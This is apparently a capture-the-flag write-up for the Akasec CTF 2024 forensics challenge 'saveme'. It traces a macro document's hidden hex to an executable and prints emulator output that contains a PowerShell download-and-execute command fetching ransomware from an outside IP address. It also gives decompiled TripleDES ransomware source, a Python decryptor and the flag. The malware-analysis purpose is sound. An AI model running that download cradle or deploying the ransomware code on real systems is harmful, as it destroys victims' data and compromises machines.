# Akasec CTF 2024 – saveme

- **Category:** Forensics
- **Points:** 100
- **Solves:** 52

## Challenge

> You know what to do. Get after it!
>
> Author: d33znu75
>
> Attachment: [saveme-chall.zip](handout/saveme-chall.zip)

## Solution

Upon extracting the zip file, we get these files,

```
└── saveme-chall
    ├── download (1).jpeg
    ├── download (2).jpeg
    ├── download (3).jpeg
    ├── download.jpeg
    ├── fuckmicrosoft.docm
    ├── images (144).png
    ├── images (1).jpeg
    ├── images (2).jpeg
    ├── images (3).jpeg
    ├── images (4).jpeg
    └── images.jpeg
```

Upon opening the `docm` file, we can see there is some text hidden by changing the font color to white. We can select all of it, and put it into [CyberChef](https://gchq.github.io/CyberChef), where we can turn it into an executable after using the `From Hex` operation.

When trying to run the [executable](solution/flag.exe), we can see that a PowerShell window opens and closes very fast, but I was not able to make out what it was doing. After doing some research, I found a tool called [speakeasy](https://github.com/mandiant/speakeasy) which is a Windows kernel emulator, used commonly for malware analysis.

```
└─$ speakeasy -t flag.exe
* exec: module_entry
0x4020c3: 'kernel32.WinExec("powershell "IEX(New-Object Net.webClient).downloadString(\'http://20.81.130.178:8080/ransomware.exe\')"", 0x1)' -> 0x20
0x4020cf: 'kernel32.GetVersion()' -> 0x1db10106
0x4020e2: 'kernel32.ExitProcess(0x0)' -> 0x0
* Finished emulating
```

From the output, we can see that the `.exe` file is downloading a file from `http://20.81.130.178:8080/ransomware.exe`. The [file](solution/ransomware.exe) is a .NET binary, so we can put it in ILspy to decompile it. The decompiled and deobfuscated code is as follows,

```csharp
// ransomware, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// b
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Ransomware {
  private static void EncryptFiles(string[] args) {
    string key = "Lp3jXluuW799rnu4";
    byte[] iv = new byte[8] {
      0,
      1,
      2,
      3,
      4,
      5,
      6,
      7
    };

    string currentDirectory = Directory.GetCurrentDirectory();
    string[] files = Directory.GetFiles(currentDirectory, "*.*");

    foreach(string filePath in files) {
      try {
        byte[] fileContent = File.ReadAllBytes(filePath);

        using(TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider()) {
          tripleDES.Key = Encoding.ASCII.GetBytes(key);
          tripleDES.IV = iv;

          byte[] encryptedContent = Encrypt(fileContent, tripleDES);

          File.WriteAllBytes(filePath, encryptedContent);

          Console.WriteLine("Encrypted: " + filePath);
        }
      } catch (Exception ex) {
        Console.WriteLine("Error: " + ex.Message);
      }
    }

    Console.ReadLine();
  }

  private static byte[] Encrypt(byte[] data, TripleDESCryptoServiceProvider tripleDES) {
    using(MemoryStream memoryStream = new MemoryStream())
    using(CryptoStream cryptoStream = new CryptoStream(memoryStream, tripleDES.CreateEncryptor(), CryptoStreamMode.Write)) {
      cryptoStream.Write(data, 0, data.Length);
      cryptoStream.FlushFinalBlock();
      return memoryStream.ToArray();
    }
  }
}
```

From the code, we can see that the executable is encrypting all the files in the current directory using TripleDES with the key `Lp3jXluuW799rnu4`. So, here is a simple python script to decrypt the files.

```python
import os

from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

ENCRYPTION_KEY = b"Lp3jXluuW799rnu4"
INITIALIZATION_VECTOR = bytearray([0, 1, 2, 3, 4, 5, 6, 7])
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png"}


def decrypt_files_in_directory(directory, key, iv, allowed_extensions):
    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        if (
            os.path.isfile(file_path)
            and os.path.splitext(file)[1].lower() in allowed_extensions
        ):
            try:
                with open(file_path, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()

                cipher = DES3.new(key, DES3.MODE_CBC, iv)
                decrypted_data = unpad(cipher.decrypt(encrypted_data), DES3.block_size)

                decrypted_file_path = (
                    os.path.splitext(file_path)[0]
                    + "_decrypted"
                    + os.path.splitext(file_path)[1]
                )
                with open(decrypted_file_path, "wb") as decrypted_file:
                    decrypted_file.write(decrypted_data)

                print(f"Decrypted {file}")
            except Exception as e:
                print(f"Failed to decrypt {file}: {e}")


if __name__ == "__main__":
    input_directory = os.getcwd()
    decrypt_files_in_directory(
        input_directory, ENCRYPTION_KEY, INITIALIZATION_VECTOR, ALLOWED_EXTENSIONS
    )
```

After running the script, we can see that the images have been decrypted, and the flag is `AKASEC{F_MiCRoSft_777}`, found in `images (144)_decrypted.png`.

![images (144)_decrypted.png](<solution/images%20(144)_decrypted.png>)
